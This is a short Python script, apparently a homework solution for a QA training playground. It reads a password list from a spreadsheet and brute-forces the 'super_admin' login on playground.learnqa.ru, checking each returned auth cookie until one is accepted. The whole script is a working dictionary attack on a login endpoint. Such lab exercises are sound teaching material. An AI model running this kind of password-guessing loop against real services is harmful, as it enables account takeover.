import pandas as pd
import requests


file = pd.read_excel('pass.xlsx')
df = pd.DataFrame(file)
passwords_list = df.values.tolist()

uniq_passes_list = []
for i in passwords_list:
    for j in i:
        if j not in uniq_passes_list:
            uniq_passes_list.append(j)
        if j in uniq_passes_list:
            pass


for password in uniq_passes_list:
    payload1 = {'login':'super_admin', 'password':password}
    response1 = requests.post('https://playground.learnqa.ru/ajax/api/get_secret_password_homework', data = payload1)
    cookie_value = response1.cookies.get('auth_cookie')
    auth_cookie = {'auth_cookie': cookie_value}
    response2 = requests.post('https://playground.learnqa.ru/ajax/api/check_auth_cookie', cookies = auth_cookie)
    if response2.text != "You are NOT authorized":
        print(password)
        print(response2.text)









